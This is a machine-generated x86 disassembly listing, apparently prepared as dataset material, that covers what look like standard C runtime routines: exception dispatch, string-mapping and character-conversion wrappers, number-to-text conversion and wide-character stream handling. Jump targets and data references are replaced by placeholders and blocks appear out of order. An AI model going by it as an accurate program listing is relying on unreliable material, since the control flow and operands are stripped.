call sub_44a2e2
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43d635
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_43ffe0
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_43ffe0
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_43ffe0
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_44b26f
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_43cb57
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_44a32e
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_43d0cc
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_43ffe0
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_43ffe0
mov edi [ eax + 0x94 ]
call sub_43ffe0
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_43d15b
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_43d15b
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_438158
test al al
jne r-xdata
call sub_44a32e
cmp eax 0x19930522
jne r-xdata
call sub_43ffe0
call sub_43ffe0
call sub_43ffe0
mov [ eax + 0x88 ] esi
call sub_43ffe0
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_43cefd
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_43d0cc
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_437cb3
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_43c3a5
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_43d5c7
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_43c924
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_43cfab
add esp 0x10
push [ esi + 0x1c ]
call sub_43d1d1
sub_43dace
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_43ffe0
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_43d73c
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_43cfab
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_43dbb4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_44b281
pop ecx
pop ecx
sub_43dbe3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_43c04c
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_43c04c
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_43f8c5
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_43dc9d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_43dbe3
pop ebp
retn
sub_43dcc7
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
push esi
cmp edi ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
call sub_43c04c
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ecx
mov [ edi ] cl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_43c04c
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov esi edi
cmp [ ebp + 0x18 ] ecx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ecx
neg ebx
adc eax ecx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push ebx
call sub_43ad30
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov eax edx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop ebx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
call sub_43f8c5
mov eax esi
jmp r-xdata
sub_43ddb3
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43dcc7
pop edi
pop ebp
retn
sub_43ddd2
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_438337
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_43de17
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44b2a1
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_43de63
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43b047
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_43deb1
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44b323
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_43df2c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_4381f8
pop ecx
sub_43df4c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_43df2c
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_438337
pop ecx
cmp eax ebx
je r-xdata
call sub_43b260
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_43df2c
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_438337
pop ecx
cmp eax ebx
je r-xdata
call sub_43b260
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_43e133
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_43df4c
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_43e179
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x40
push edi
mov ebx rw-data
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_43917d
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_44b391
mov ecx [ esi ]
movzx eax [ ecx ]
add ecx 0x2
mov [ esi ] ecx
jmp r-xdata
mov eax ebx
push esi
call sub_43917d
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x40
jne r-xdata
dec [ esi + 0x4 ]
js r-xdata
push esi
call sub_43917d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_43917d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
push esi
call sub_43917d
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_4402a7
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
test [ eax + 0x24 ] 0x7f
je r-xdata
mov eax ebx
push esi
call sub_43917d
pop ecx
cmp eax 0xfffffffe
je r-xdata
dec [ esi + 0x4 ]
mov [ ebp + 0x8 ] al
js r-xdata
mov eax 0xffff
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
xor edi edi
inc edi
dec [ esi + 0x4 ]
js r-xdata
push esi
call sub_43917d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_43917d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
push esi
call sub_4402a7
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
push esi
call sub_4402a7
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov [ ebp + 0x9 ] al
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] al
movzx eax al
push eax
call sub_44b629
pop ecx
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
call sub_44b5d7
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
dec [ esi + 0x4 ]
js r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
call sub_43c04c
mov [ eax ] 0x2a
jmp r-xdata
push esi
call sub_4402a7
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
push 0x2
mov [ ebp - 0x3 ] al
pop edi
movsx eax [ ebp - 0x4 ]
push esi
push eax
call sub_43e988
pop ecx
mov eax 0xffff
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
pop ecx
sub_43e324
push 0xc
push r--data
call sub_43f8e0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_43e179
pop ecx
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43e385
mov ax [ ebp - 0x1c ]
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
mov eax 0xffff
jmp r-xdata
call sub_43f925
retn
sub_43e38f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_43917d
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_44b63c
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_43917d
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
push esi
call sub_43917d
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_43917d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_43917d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_43917d
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_43917d
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_43917d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_43917d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_43917d
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44b905
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_43917d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_43917d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_440f95
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_43e516
push 0xc
push r--data
call sub_43f8e0
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
mov [ ebp + 0xc ] esi
push esi
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x8 ]
call sub_43e38f
pop ecx
pop ecx
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43e57c
mov ax [ ebp - 0x1c ]
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
mov eax 0xffff
jmp r-xdata
call sub_43f925
retn
sub_43e586
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi 0xffff
mov eax edi
cmp bx ax
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
push esi
call sub_44b922
pop ecx
test al 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
add eax 0x2
cmp [ esi ] eax
jae r-xdata
push esi
call sub_43917d
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
add [ esi ] 0xfffffffe
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
push esi
call sub_43917d
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov [ eax ] bx
cmp [ eax ] bx
je r-xdata
cmp [ esi + 0x18 ] 0x2
jb r-xdata
mov ebx [ ebp + 0x8 ]
push esi
call sub_43917d
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_43917d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_43917d
and eax 0x1f
shl eax 0x6
add eax [ edi ]
pop ecx
pop ecx
mov edi 0xffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
mov eax [ esi + 0xc ]
add [ esi + 0x4 ] 0x2
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov ax bx
jmp r-xdata
add eax 0x2
mov [ esi ] eax
mov [ esi ] eax
mov eax ebx
push esi
call sub_43917d
pop ecx
cmp eax 0xfffffffe
je r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44b905
add esp 0x10
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x2
pop eax
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] dh
mov [ ebp - 0x10 ] eax
jmp r-xdata
push esi
call sub_43917d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_43917d
and eax 0x1f
shl eax 0x6
add eax [ edi ]
pop ecx
pop ecx
mov edi 0xffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
add ecx eax
cmp [ esi ] ecx
jae r-xdata
test [ eax + 0x24 ] 0x7f
je r-xdata
lea ecx [ eax - 0x1 ]
test ecx ecx
js r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
add [ esi + 0x4 ] eax
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov ax dx
jmp r-xdata
dec [ esi ]
dec ecx
mov bl [ ebp + ecx - 0xb ]
mov eax [ esi ]
mov [ eax ] bl
jns r-xdata
cmp eax [ esi + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x10 ]
mov [ esi ] ecx
sub_43e740
push 0xc
push r--data
call sub_43f8e0
xor eax eax
cmp [ ebp + 0xc ] eax
setne al
test eax eax
jne r-xdata
push [ ebp + 0xc ]
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43e586
pop ecx
pop ecx
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43e7a5
mov ax [ ebp - 0x1c ]
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
mov eax 0xffff
jmp r-xdata
call sub_43f925
retn
sub_43e7af
push 0xc
push r--data
call sub_43f8e0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
mov ebx [ ebp + 0x10 ]
cmp ebx 0x4
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_43f925
retn
mov edi [ ebp + 0x14 ]
lea eax [ edi - 0x2 ]
cmp eax 0x7ffffffd
jbe r-xdata
cmp ebx 0x40
jne r-xdata
